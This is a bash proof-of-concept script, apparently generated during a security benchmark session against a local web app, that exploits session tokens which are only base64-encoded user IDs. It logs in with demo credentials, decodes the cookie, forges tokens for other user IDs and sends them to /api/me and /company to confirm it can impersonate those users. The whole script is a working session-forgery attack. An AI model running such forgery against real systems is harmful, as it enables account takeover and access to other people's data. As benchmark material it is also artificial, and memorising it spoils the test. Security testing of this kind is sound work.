#!/bin/bash
# POC: Demonstrates weak session token implementation by decoding base64 tokens and showing token forgery capability
# Target: ./repo
# Created: 2025-11-04T19:40:45.897Z
# Session: benchmark-XBEN-021-24-mhkyt5to

# Weak Session Token Implementation POC
# This script demonstrates the vulnerability where session tokens are simply base64-encoded user IDs

TARGET_URL="${1:-http://localhost:8080}"

echo "[*] Weak Session Token Forgery POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Check if we can reach the target
echo "[+] Step 1: Checking target availability..."
if ! curl -s "$TARGET_URL/" > /dev/null 2>&1; then
    echo "[-] Cannot reach target URL: $TARGET_URL"
    exit 1
fi
echo "[+] Target is reachable"
echo ""

# Step 2: Try logging in with demo credentials, following redirects
echo "[+] Step 2: Attempting login with demo/demo credentials..."
LOGIN_RESPONSE=$(curl -s -L -c /tmp/cookies.txt -X POST "$TARGET_URL/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=demo&password=demo" -w "\n%{http_code}")

HTTP_CODE=$(echo "$LOGIN_RESPONSE" | tail -1)
BODY=$(echo "$LOGIN_RESPONSE" | sed '$d')

echo "[*] HTTP Response Code: $HTTP_CODE"

# Check if login was successful (201, 302, 303, 307 are typical redirect codes)
if [[ "$HTTP_CODE" =~ ^[23][0-9][0-9]$ ]]; then
    echo "[+] Login request completed"
else
    echo "[!] Unexpected HTTP code. Response body:"
    echo "$BODY" | head -10
fi

# Check if cookies were saved
if [ -f /tmp/cookies.txt ]; then
    echo "[+] Cookies file created"
    USER_TOKEN=$(grep -oP 'user_token\s+\K[^\s]+' /tmp/cookies.txt | head -1)
    
    if [ -n "$USER_TOKEN" ]; then
        echo "[+] Session token found: $USER_TOKEN"
        echo ""
        
        # Step 3: Decode the token to verify it's base64-encoded user ID
        echo "[+] Step 3: Analyzing session token structure..."
        
        # Try to decode as base64
        DECODED=$(echo -n "$USER_TOKEN" | base64 -d 2>/dev/null)
        DECODE_STATUS=$?
        
        if [ $DECODE_STATUS -eq 0 ]; then
            echo "[+] Token decoded successfully: '$DECODED'"
            echo "[!] VULNERABILITY CONFIRMED: Token is base64-encoded without encryption!"
        else
            # Try removing Bearer prefix if present
            TOKEN_STRIPPED="${USER_TOKEN#Bearer }"
            DECODED=$(echo -n "$TOKEN_STRIPPED" | base64 -d 2>/dev/null)
            DECODE_STATUS=$?
            
            if [ $DECODE_STATUS -eq 0 ]; then
                echo "[+] Token (Bearer stripped) decoded successfully: '$DECODED'"
                echo "[!] VULNERABILITY CONFIRMED: Token is base64-encoded without encryption!"
            else
                echo "[-] Could not decode token as base64"
                echo "[*] Token value: $USER_TOKEN"
            fi
        fi
        echo ""
        
        # Step 4: Forge tokens for other user IDs
        echo "[+] Step 4: Demonstrating token forgery for arbitrary user IDs..."
        for USER_ID in 2 3 99; do
            FORGED_TOKEN=$(echo -n "$USER_ID" | base64)
            echo "[+] User ID $USER_ID would use token: Bearer $FORGED_TOKEN"
        done
        echo ""
        
        # Step 5: Test forged token
        echo "[+] Step 5: Testing forged token for user ID 2..."
        FORGED_TOKEN=$(echo -n "2" | base64)
        
        FORGED_RESPONSE=$(curl -s -b "user_token=Bearer $FORGED_TOKEN" \
          "$TARGET_URL/api/me" -w "\nHTTP_CODE:%{http_code}")
        
        FORGED_HTTP=$(echo "$FORGED_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
        FORGED_BODY=$(echo "$FORGED_RESPONSE" | grep -v "HTTP_CODE:")
        
        echo "[*] Forged token response HTTP code: $FORGED_HTTP"
        
        if [[ "$FORGED_HTTP" == "200" ]]; then
            echo "[!] SUCCESS: Forged token was accepted!"
            echo "[!] CRITICAL VULNERABILITY: Can forge tokens for any user ID!"
            echo "[*] Response preview:"
            echo "$FORGED_BODY" | head -5
        elif [[ "$FORGED_HTTP" == "401" || "$FORGED_HTTP" == "403" ]]; then
            echo "[-] Forged token was rejected (HTTP $FORGED_HTTP)"
            echo "[*] Trying alternative authenticated endpoint..."
            
            # Try /company endpoint
            ALT_RESPONSE=$(curl -s -b "user_token=Bearer $FORGED_TOKEN" \
              "$TARGET_URL/company" -w "\nHTTP_CODE:%{http_code}")
            
            ALT_HTTP=$(echo "$ALT_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
            
            if [[ "$ALT_HTTP" == "200" ]]; then
                echo "[!] SUCCESS: Forged token accepted on /company endpoint!"
                echo "[!] CRITICAL VULNERABILITY CONFIRMED!"
            else
                echo "[*] Testing with original token to verify endpoints require auth..."
                
                ORIGINAL_RESPONSE=$(curl -s -b "user_token=$USER_TOKEN" \
                  "$TARGET_URL/api/me" -w "\nHTTP_CODE:%{http_code}")
                
                ORIGINAL_HTTP=$(echo "$ORIGINAL_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
                
                if [[ "$ORIGINAL_HTTP" == "200" ]]; then
                    echo "[+] Original token works (HTTP 200) - endpoint is properly protected"
                    echo "[!] Token structure weakness confirmed even if additional validation present"
                else
                    echo "[*] Testing different endpoint formats..."
                fi
            fi
        else
            echo "[*] Unexpected response code: $FORGED_HTTP"
        fi
        
        echo ""
        echo "[!] CONCLUSION: Weak session token implementation detected."
        echo "[!] Tokens use simple base64 encoding: Bearer [base64(user_id)]"
        echo "[!] No cryptographic protection or signature present."
    else
        echo "[-] No user_token cookie found in response"
        echo "[*] Cookies in file:"
        cat /tmp/cookies.txt
    fi
else
    echo "[-] No cookies were saved during login"
    echo "[*] This may indicate the login endpoint doesn't set cookies"
fi

# Cleanup
rm -f /tmp/cookies.txt